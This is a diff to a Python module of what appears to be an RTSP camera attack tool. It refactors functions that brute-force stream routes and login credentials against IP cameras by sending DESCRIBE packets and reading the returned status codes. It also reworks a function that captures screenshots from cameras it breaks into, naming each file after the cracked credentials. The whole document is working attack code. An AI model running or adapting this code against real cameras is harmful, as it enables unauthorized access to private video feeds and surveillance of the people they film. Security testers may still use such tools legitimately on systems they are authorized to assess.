@@ -1,9 +1,11 @@
 import logging
+from logging import log
 import socket
 import sys
 import typing
 
 import av
+from colorama import Fore, Style
 
 from modules import utils
 from modules.rtsp import AuthMethod, RTSPClient, Status
@@ -15,6 +17,23 @@ dummy_route = "/0x8b6c42"
 logger = logging.getLogger("debugger")
 
 
+def try_to(func, target, *args):
+    try:
+        func(*args)
+        return True
+    except (socket.timeout, TimeoutError) as e:
+        logger.debug(f"Skipping {target.ip}: {repr(e)}")
+        target.status = Status.TIMEOUT
+        return False
+    except ConnectionResetError as e:
+        logger.debug(f"Skipping {target.ip}: {repr(e)}")
+        target.status = Status.BLOCKED
+        return False
+    except Exception as e:
+        logger.debug(f"{func.__name__} failed for {target.ip}:{target.port}: {repr(e)}")
+        return False
+
+
 def attack_route(target: RTSPClient) -> typing.Union[RTSPClient, bool]:
     # If the stream responds positively to the dummy route, it means
     # it doesn't require (or respect the RFC) a route and the attack
@@ -22,7 +41,6 @@ def attack_route(target: RTSPClient) -> typing.Union[RTSPClient, bool]:
     ok = route_attack(target, dummy_route)
     if ok:
         target.routes.append("/")
-        utils.detect_auth_method(target)
         return target
 
     # Otherwise, bruteforce the routes.
@@ -30,7 +48,6 @@ def attack_route(target: RTSPClient) -> typing.Union[RTSPClient, bool]:
         ok = route_attack(target, route)
         if ok:
             target.routes.append(route)
-            utils.detect_auth_method(target)
             return target
         # If target is timeouted or aborted connection, it's probably
         # not available and can be skipped.
@@ -40,47 +57,39 @@ def attack_route(target: RTSPClient) -> typing.Union[RTSPClient, bool]:
 
 def route_attack(target: RTSPClient, route) -> bool:
     # Create socket connection.
-    try:
-        target.connect()
-    except socket.timeout as e:
-        logger.debug(f"Skipping {target.ip}: {str(e)}")
-        target.status = Status.TIMEOUT
-        return False
-    except Exception as e:
-        logger.debug(f"Connect failed for {target.ip}:{target.port}: {str(e)}")
+    target.socket = socket.socket()
+    connected = try_to(target.connect, target)
+    if not connected:
+        target.socket.close()
         return False
 
-    # Send describe packet.
-    attack_url = f"rtsp://{target.credentials}@{target.ip}:{target.port}{route}"
+    # Create describe packet and send it.
     target.create_packet(route)
-    try:
-        target.send_packet()
-    except socket.timeout as e:
-        logger.debug(f"Skipping {target.ip}: {str(e)}")
-        target.status = Status.TIMEOUT
+    sent = try_to(target.send_packet, target)
+    if not sent:
+        target.socket.close()
         return False
-    except ConnectionResetError as e:
-        logger.debug(f"Skipping {target.ip}: {str(e)}")
-        target.status = Status.BLOCKED
-        return False
-    except Exception as e:
-        logger.debug(f"Send failed for {attack_url}: {str(e)}")
-        return False
+
+    attack_url = RTSPClient.get_rtsp_url(
+        target.ip, target.port, target.credentials, route
+    )
 
     # Get return code.
     try:
-        code = utils.detect_code(str(target._data))
+        code = utils.detect_code(str(target.data))
     except Exception as e:
-        logger.debug(f"get_code failed for {attack_url}: {str(e)}, {target._data}")
+        logger.debug(f"get_code failed for {attack_url}: {repr(e)}, {target.data}")
+        target.socket.close()
         return False
 
     logger.debug(f"DESCRIBE {attack_url} RTSP/1.0 > {code}")
+    target.socket.close()
     # If it's a 401 or 403, it means that the credentials are wrong but the route might be okay.
     # If it's a 200, the stream is accessed successfully.
     if code == 200 or code == 401 or code == 403:
         return True
-
-    return False
+    else:
+        return False
 
 
 def attack_credentials(target: RTSPClient):
@@ -90,8 +99,6 @@ def attack_credentials(target: RTSPClient):
         ok = credentials_attack(target, ":")
         if ok:
             return target
-        else:
-            utils.detect_auth_method(target)
 
     # Otherwise, bruteforce the routes.
     for cred in config.CREDENTIALS:
@@ -103,130 +110,104 @@ def attack_credentials(target: RTSPClient):
             return False
         utils.detect_auth_method(target)
 
-    # Some cameras run GST RTSP Server which prioritizes 401 over 404 contrary to most cameras.
-    # For these cameras, running another route attack will solve the problem.
-    # if not target.route_found or not target.credentials_found or not target.available:
-    #   result = attack_route(target)
-    #   return bool(result) and validate_stream(target)
-
 
 def credentials_attack(target: RTSPClient, cred):
     # Create socket connection.
-    try:
-        target.connect()
-    except socket.timeout as e:
-        logger.debug(f"Skipping {target.ip}: {str(e)}")
-        target.status = Status.TIMEOUT
-        return False
-    except Exception as e:
-        logger.debug(f"Connect failed for {target.ip}:{target.port}: {str(e)}")
+    target.socket = socket.socket()
+    connected = try_to(target.connect, target)
+    if not connected:
+        target.socket.close()
         return False
 
-    # Send describe packet.
-    attack_url = f"rtsp://{cred}@{target.ip}:{target.port}{target.route}"
+    # Create describe packet and send it.
     target.create_packet(target.route, cred)
-    try:
-        target.send_packet()
-    except socket.timeout as e:
-        logger.debug(f"Skipping {target.ip}: {str(e)}")
-        target.status = Status.TIMEOUT
+    sent = try_to(target.send_packet, target)
+    if not sent:
+        target.socket.close()
         return False
-    except Exception as e:
-        logger.debug(f"Send failed for {attack_url}: {str(e)}")
-        return False
+
+    attack_url = RTSPClient.get_rtsp_url(target.ip, target.port, cred, target.route)
 
     # Get return code.
     try:
-        code = utils.detect_code(str(target._data))
+        code = utils.detect_code(str(target.data))
     except Exception as e:
-        logger.debug(f"get_code failed for {attack_url}: {str(e)}")
+        logger.debug(f"get_code failed for {attack_url}: {repr(e)}")
         return False
 
     logger.debug(f"DESCRIBE {attack_url} RTSP/1.0 > {code}")
-    logger.debug(f"{target._packet} ({attack_url}) > {target._data}")
+    logger.debug(f"{target._local.packet} ({attack_url}) > {target.data}")
+    target.socket.close()
     # If it's a 404, it means that the route is incorrect but the credentials might be okay.
     # If it's a 200, the stream is accessed successfully.
-    if code == 200 or code == 404:
-        return True
-
-    return False
-
-
-def validate_stream(target: RTSPClient):
-    target.available = stream_validate(target)
-    return target.available
-
-
-def stream_validate(target: RTSPClient):
-    # Create socket connection.
-    try:
-        target.connect()
-    except socket.timeout as e:
-        logger.debug(f"Skipping {target.ip}: {str(e)}")
-        target.status = Status.TIMEOUT
-        return False
-    except Exception as e:
-        logger.debug(f"Connect failed for {target.ip}:{target.port}: {str(e)}")
-        return False
-
-    # Send describe packet.
-    attack_url = f"rtsp://{target.credentials}@{target.ip}:{target.port}{target.route}"
-    target.create_packet(target.route, target.credentials)
-    try:
-        target.send_packet()
-    except socket.timeout as e:
-        logger.debug(f"Skipping {target.ip}: {str(e)}")
-        target.status = Status.TIMEOUT
-        return False
-    except Exception as e:
-        logger.debug(f"Send failed for {attack_url}: {str(e)}")
-        return False
-
-    # Get return code.
-    try:
-        code = utils.detect_code(str(target._data))
-    except Exception as e:
-        logger.debug(f"get_code failed for {attack_url}: {str(e)}")
-        return False
-
-    logger.debug(f"DESCRIBE {attack_url} RTSP/1.0 > {code}")
-    logger.debug(f"{target._packet} ({attack_url}) > {target._data}")
-    # If it's a 200, the stream is accessed successfully.
     if code == 200:
-        logging.info(f"Working stream at {attack_url}")
+        logging.info(f"{Style.DIM}Working stream at {attack_url}{Style.RESET_ALL}")
         logger.debug(
             f"Working stream at {attack_url} with {target.auth_method.name} auth"
         )
         return True
+    elif code == 404:
+        logging.info(f"Incorrect stream route, but OK credentials at {attack_url}")
+        logger.debug(
+            f"Incorrect stream route at {attack_url} with {target.auth_method.name} auth"
+        )
+        return True
+    else:
+        return False
 
-    return False
 
-
-def get_screenshot(target: RTSPClient) -> str:
-    username: str
-    password: str
-    file_name: str
-    username, password = target.credentials.split(":")
-    file_name = utils.escape_chars(
-        f"{username}_{password}_{target.ip}_{target.port}_{target.route.lstrip('/')}.jpg"
-    )
+def get_screenshot(target: RTSPClient, tries=0) -> str:
+    file_name = utils.escape_chars(f"{str(target).lstrip('rtsp://')}.jpg")
     file_path = config.PICS_FOLDER / file_name
 
     try:
         with av.open(
-            utils.get_camera_rtsp_url(target),
-            options={"rtsp_transport": "tcp"},
+            str(target),
+            options={
+                "rtsp_transport": "tcp",
+                "rtsp_flags": "prefer_tcp",
+                "stimeout": "3000000",
+            },
             timeout=60.0,
         ) as video:
+            if (
+                video.streams.video[0].profile is None
+                and video.streams.video[0].start_time is None
+                and video.streams.video[0].codec_context.format is None
+            ):
+                # There's a high possibility that this video stream is broken
+                # or something else, so we try again just to make sure
+                if tries == 0:
+                    video.close()
+                    return get_screenshot(target, 1)
+                else:
+                    logger.debug(
+                        f"Broken video stream or unknown issues with {str(target)}"
+                    )
+                    return ""
             video.streams.video[0].thread_type = "AUTO"
             for frame in video.decode(video=0):
-                img = frame.to_image().save(file_path)
+                frame.to_image().save(file_path)
                 break
+    except (MemoryError, PermissionError, av.InvalidDataError) as e:
+        # Those errors occurs when there's too much SCREENSHOT_THREADS.
+        logger.debug(f"Missed screenshot of {str(target)}: {repr(e)}")
+        # Try one more time in hope for luck.
+        if tries == 0:
+            logging.info(
+                f"{Fore.YELLOW}Retry to get a screenshot of the {str(target)}{Style.RESET_ALL}"
+            )
+            return get_screenshot(target, 1)
+        else:
+            logging.error(
+                f"{Fore.RED}Missed screenshot of {str(target)}: if you see this message a lot - consider lowering SCREENSHOT_THREADS ({config.SCREENSHOT_THREADS})"
+            )
+            return ""
     except Exception as e:
-        logger.debug(
-            f"get_screenshot failed with {utils.get_camera_rtsp_url(target)}: {repr(e)}"
-        )
+        logger.debug(f"get_screenshot failed with {str(target)}: {repr(e)}")
         return ""
 
-    logging.info(f"Captured screenshot for {utils.get_camera_rtsp_url(target)}")
+    logging.info(
+        f"{Style.BRIGHT}Captured screenshot for {str(target)}{Style.RESET_ALL}"
+    )
     return file_path
